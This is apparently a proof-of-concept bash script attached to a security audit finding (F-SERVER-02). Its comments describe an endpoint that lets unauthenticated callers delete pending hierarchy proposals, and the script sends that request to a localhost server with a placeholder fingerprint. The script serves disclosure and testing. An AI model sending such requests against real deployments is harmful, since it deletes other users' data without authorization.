#!/usr/bin/env bash
# F-SERVER-02 — Unauthenticated deletion of pending hierarchy proposals
#
# `handlePostHierarchyReject` (server/handlers/hierarchy.ts:158-187) validates
# that the supplied `fingerprint` is one of the proposal's master/child but
# requires NO cryptographic proof that the caller controls that fingerprint.
# Result: any internet caller can delete any pending hierarchy proposal by
# guessing/scraping its proposalId.
#
# Reproduction (assuming a victim has a pending proposal with id=1 between
# masterFingerprint=ebpdk1victim and childFingerprint=ebpdk1other):
#
#   curl -X POST http://localhost:8080/api/v1/hierarchy/reject \
#     -H 'content-type: application/json' \
#     -d '{"proposalId": 1, "fingerprint": "ebpdk1victim..."}'
#
# Server responds {"ok": true} and the proposal is deleted.

URL='http://localhost:8080/api/v1/hierarchy/reject'
BODY='{"proposalId": 1, "fingerprint": "REPLACE_WITH_ACTUAL_BECH32_FINGERPRINT"}'

echo "POST $URL"
echo "Body: $BODY"
echo "---"
curl -s -X POST "$URL" -H 'content-type: application/json' -d "$BODY"
echo
